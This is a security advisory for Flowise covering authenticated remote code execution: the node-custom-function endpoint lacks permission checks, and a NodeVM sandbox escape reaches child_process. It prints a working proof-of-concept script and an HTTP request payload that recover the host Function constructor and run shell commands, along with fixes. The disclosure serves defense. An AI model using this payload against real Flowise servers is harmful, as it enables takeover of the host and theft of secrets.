# [C] FlowiseAI: Authenticated Host RCE via POST /api/v1/node-custom-function and NodeVM Sandbox Escape

## Summary
Severity: Critical
Advisory: GHSA-9rvc-vf7m-pgm2
CVE: CVE-2026-46442
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-9rvc-vf7m-pgm2
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.2

## Details
### Summary

`POST /api/v1/node-custom-function` lacks route-level authorization, allowing any authenticated user or API key to submit arbitrary JavaScript to the `Custom JS Function` node.

When `E2B_APIKEY` is not configured — the common deployment case — Flowise executes this code inside a `NodeVM` sandbox. This sandbox can be escaped, allowing an attacker to reach the host `process` object and execute system commands via `child_process`.

The result is authenticated remote code execution on the Flowise server host. CVSS v3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **9.9 Critical**.

### Details

Two distinct security boundaries are violated.

**1. Missing route-level authorization**

`packages/server/src/routes/node-custom-functions/index.ts` registers the endpoint with no permission middleware:

```ts
router.post('/', nodesRouter.executeCustomFunction)
```

Other sensitive routes in the same codebase use explicit permission gates:

```ts
// packages/server/src/routes/chatflows/index.ts
router.post(
  '/',
  checkAnyPermission('chatflows:create,chatflows:update,agentflows:create,agentflows:update'),
  chatflowsController.saveChatflow
)
```

Global `/api/v1` authentication still applies, so this is not unauthenticated — but any valid session or API key reaches the endpoint without further restriction.

**2. NodeVM sandbox escape**

The endpoint forwards `body.javascriptFunction` through the following chain:

```
POST /api/v1/node-custom-function
  → packages/server/src/controllers/nodes/index.ts
  → packages/server/src/utils/executeCustomNodeFunction.ts
  → packages/components/nodes/utilities/CustomFunction/CustomFunction.ts
    executeJavaScriptCode(javascriptFunction, sandbox)
  → packages/components/src/utils.ts
    if !process.env.E2B_APIKEY → NodeVM fallback
  → [SINK] host process / child_process
```

`packages/components/src/utils.ts` only uses the external E2B sandbox when `E2B_APIKEY` is set. Otherwise it silently falls back to `@flowiseai/nodevm`:

```ts
const shouldUseSandbox = useSandbox && process.env.E2B_APIKEY
```

Flowise explicitly frames this as a sandboxed execution path — the helper is named `createCodeExecutionSandbox`, its inline comment reads `Execute JavaScript code using either Sandbox or NodeVM`, and the NodeVM instance is configured with `eval: false`, `wasm: false`, and mocked HTTP clients. The sandbox is a real declared security boundary, not incidental isolation.

These controls do not prevent escape. The payload abuses an exception path where an `Error` object escapes the NodeVM boundary. Because the error originates from the host runtime, its constructor chain resolves to the outer Node.js realm. This allows recovery of the host `Function` constructor (`e.constructor.constructor`), which can then access `process` and built-in modules such as `child_process`:

```js
const FunctionCtor = e.constructor.constructor;
const cp = FunctionCtor('return process.getBuiltinModule("child_process")')();
return cp.execSync('id').toString().trim();
```

The NodeVM fallback is the practical default. `packages/server/.env.example` and `CONTRIBUTING.md` do not require `E2B_APIKEY` for custom JS execution, so most deployments are affected.

### PoC

**Standalone verification** (run from the repository root with `E2B_APIKEY` unset):

```js
// poc_Flowise_NodeCustomFunction_RCE_2026.js
const path = require('path');

delete process.env.E2B_APIKEY;
process.env.TS_NODE_COMPILER_OPTIONS = JSON.stringify({ moduleResolution: 'NodeNext' });

require(path.resolve('targets/Flowise/node_modules/ts-node/register/transpile-only'));

const { nodeClass: CustomFunction } = require(path.resolve(
  'targets/Flowise/packages/components/nodes/utilities/CustomFunction/CustomFunction.ts'
));

const attackCode = `
async function f() {
  const error = new Error();
  error.name = Object.create(null);
  return error.stack;
}
return await f().catch(e => {
  const FunctionCtor = e.constructor.constructor;
  const cp = FunctionCtor('return process.getBuiltinModule("child_process")')();
  return cp.execSync('id').toString().trim();
});
`;

(async () => {
  const node = new CustomFunction();
  const result = await node.init(
    { inputs: { javascriptFunction: attackCode } },
    '',
    { appDataSource: {}, databaseEntities: {}, workspaceId: undefined, orgId: undefined }
  );
  console.log('[RCE OUTPUT]', result);
})();
```

Confirmed output:

```
[RCE OUTPUT] uid=501(researcher) gid=20(staff) groups=20(staff),...
```

**HTTP trigger** (requires a valid API key or session):

```http
POST /api/v1/node-custom-function HTTP/1.1
Host: target:3000
Authorization: Bearer <valid-api-key>
Content-Type: application/json

{
  "javascriptFunction": "async function f(){const error=new Error();error.name=Object.create(null);return error.stack;} return await f().catch(e=>{const F=e.constructor.constructor;const cp=F('return process.getBuiltinModule(\"child_process\")')();return cp.execSync('id').toString().trim();});"
}
```

### Impact

Any authenticated Flowise user or holder of a standard API key can execute arbitrary commands as the Flowise server process. This includes reading environment variables and secrets, arbitrary filesystem access, outbound network requests from the host, and a foothold for persistence or lateral movement.

The NodeVM fallback is the default for any deployment without `E2B_APIKEY` configured, which covers the majority of self-hosted instances.

**Recommended remediation:**
1. Add explicit permission gating to `POST /api/v1/node-custom-function` using the existing `checkPermission` middleware pattern.
2. Fail closed if `E2B_APIKEY` is absent — do not silently downgrade to NodeVM for untrusted code execution.
3. Restrict this endpoint from generic API key access.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9rvc-vf7m-pgm2
- https://nvd.nist.gov/vuln/detail/CVE-2026-46442
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2
